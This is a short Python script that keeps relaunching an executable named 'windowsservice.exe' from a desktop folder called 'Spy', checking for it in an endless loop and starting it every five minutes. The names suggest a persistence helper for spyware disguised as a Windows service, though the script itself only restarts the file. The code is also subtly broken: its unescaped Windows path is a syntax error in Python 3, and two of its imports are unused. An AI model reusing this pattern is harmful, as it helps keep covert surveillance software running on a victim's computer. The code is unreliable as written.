
import os
import time
from datetime import datetime
import ctypes
while True:
    if not os.path.exists("C:\Users\Keer\Desktop\Spy\windowsservice.exe"):
        time.sleep(60)
        continue
    os.system(f'start "" "C:\Users\Keer\Desktop\Spy\windowsservice.exe"')
    time.sleep(300)
